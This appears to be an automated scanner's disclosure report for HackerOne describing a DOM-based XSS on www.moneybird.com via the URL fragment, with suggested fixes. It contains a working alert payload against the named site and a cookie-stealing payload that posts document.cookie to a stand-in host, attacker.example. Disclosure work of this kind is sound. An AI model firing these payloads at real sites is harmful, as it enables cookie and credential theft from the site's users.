# DOM-Based XSS via URL Fragment — www.moneybird.com

**Platform:** HackerOne | **Program:** Moneybird  
**Severity:** High | **CVSS Score:** 7.0  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`  
**CWE:** CWE-79 (Cross-Site Scripting) | **OWASP:** A03:2021 — Injection  
**Scan date:** 2026-03-22 | **Detection:** Playwright DOM-sink analysis (auto-confirmed)  
**Confidence:** High

---

## Summary

The Moneybird marketing homepage (`www.moneybird.com`) passes URL fragment content directly to `innerHTML` without sanitization. An attacker can craft a link containing an HTML/JavaScript payload in the fragment identifier and trick a victim into clicking it, causing arbitrary JavaScript execution in the victim's browser on the `moneybird.com` origin.

---

## Steps to Reproduce

**Prerequisites:** No account required. Works in any browser.

1. Open the following URL in a browser (or send it to a victim):
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
2. Observe an alert dialog displaying `www.moneybird.com`.
3. The payload fires because JavaScript reads `window.location.hash` and writes it into the DOM via `innerHTML` with no sanitization. The scanner confirmed the payload reaches at least **two independent `innerHTML` sinks** on the page.

**cURL sanity-check (confirms the page loads fragment-handling JS):**
```bash
curl -sL 'https://www.moneybird.com/' | grep -i 'location.hash\|innerHTML'
```
Note: Fragment execution is client-side and will not appear in `curl` output — verify with a real browser.

---

## Proof of Concept

Minimal payload demonstrating arbitrary JS execution:
```
https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
```

More impactful credential-harvesting payload (for demonstration only, not executed):
```
https://www.moneybird.com/#<script>document.write('<form action=https://attacker.example/steal method=POST><input name=t type=hidden value='+document.cookie+'><input type=submit></form>')</script>
```

---

## Impact

An attacker can:

1. **Steal cookies** scoped to `moneybird.com` (or accessible subdomains) from any victim who clicks the link — including any session tokens shared between `www.moneybird.com` and the application.
2. **Harvest login credentials** by overlaying a fake login form over the Moneybird page, intercepting credentials before they reach the real app.
3. **Redirect users** away from the login page to attacker-controlled phishing pages, combined with the absence of a Content-Security-Policy header (confirmed separately) which removes any browser-level mitigation.
4. **Exfiltrate page content** visible to the victim — including any personalization or PII rendered by the server.

The missing CSP header (confirmed in the same scan) compounds this finding: there is no browser-enforced restriction on where scripts can run or data can be sent.

**Severity note:** The XSS fires on the marketing homepage rather than the authenticated app UI. The realistic attack chain is phishing/credential theft; direct session theft depends on the cookie scope configuration.

---

## Suggested Fix

1. **Immediate:** Audit all code that reads `window.location.hash` and replace `innerHTML` with `textContent` for plain text content. If HTML rendering is required, sanitize with DOMPurify before assignment:
   ```js
   // Vulnerable
   element.innerHTML = window.location.hash.slice(1);

   // Safe — plain text
   element.textContent = decodeURIComponent(window.location.hash.slice(1));

   // Safe — if HTML required
   import DOMPurify from 'dompurify';
   element.innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
   ```

2. **Defense-in-depth:** Deploy a Content-Security-Policy header (see companion finding) to prevent inline script execution even if a sink is missed:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

---

## References

- OWASP: [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PortSwigger: [DOM XSS via location.hash](https://portswigger.net/web-security/cross-site-scripting/dom-based)
